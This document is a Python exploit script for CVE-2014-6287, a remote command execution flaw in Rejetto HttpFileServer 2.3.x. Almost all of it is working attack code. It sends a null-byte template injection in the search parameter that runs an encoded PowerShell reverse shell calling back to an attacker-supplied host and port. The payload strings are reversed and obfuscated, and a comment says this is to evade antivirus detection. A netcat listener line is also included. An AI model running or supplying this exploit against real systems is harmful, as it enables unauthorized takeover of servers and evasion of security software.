# Exploit Title: Rejetto HttpFileServer 2.3.x - Remote Command Execution
# CVE : CVE-2014-6287
# Original Author: Ã“scar Andreu
# Edit by 20100dbg
# Vendor Homepage: http://rejetto.com/
# Software Link: http://sourceforge.net/projects/hfs/
# Version: 2.3.x

import urllib.parse
import requests
import base64
import os
import sys


if len(sys.argv) != 5 or sys.argv[1] in ['-h', '--help']:
    print("Rejetto HttpFileServer 2.3.x")
    print("Please start netcat listener on LPORT")
    print("usage :", sys.argv[0], "LHOST LPORT RHOST RPORT")
    exit(2)
else:
    LHOST = sys.argv[1]
    LPORT = sys.argv[2]
    RHOST = sys.argv[3]
    RPORT = sys.argv[4]

#from https://www.revshells.com/
#reversed to evade AV detection
x = '"(tneilCPCT.stekcoS.teN.metsyS tcejbO-weN = c$'
y = ')(esolC.c$;})(hsulF.s$;)htgneL.etybdnes$,0,etybdnes$(etirW.s$;)2bs$(setyBteG.)IICSA::]gnidocne.txet[( = etybdnes$;" >" + htaP.)dwp( + " SP" + bs$ = 2bs$;) gnirtS-tuO | 1&>2 atad$ xei( = bs$;)i$ ,0,setyb$(gnirtSteG.)gnidocnEIICSA.txeT.metsyS emaNepyT- tcejbO-weN( = atad$;{)0 en- ))htgneL.setyb$ ,0 ,setyb$(daeR.s$ = i$((elihw;}0{%|53556..0 = setyb$]][etyb[;)(maertSteG.c$ = s$;)'

revshell = x[::-1] + LHOST +'",'+ LPORT + y[::-1]

#we need UTF-16
revshell = revshell.encode('utf-16le')

revshell_b64 = base64.b64encode(revshell)
shell = "pow"+"ershe"+"ll.exe -e " + revshell_b64.decode()

res = requests.get(f'http://{RHOST}:{RPORT}/?search=%00{{.+exec|{urllib.parse.quote(shell)}+.}}')

#If the listener is too slow, start it in another shell and before this exploit
#os.system("/usr/bin/nc -lvnp " + str(LPORT))
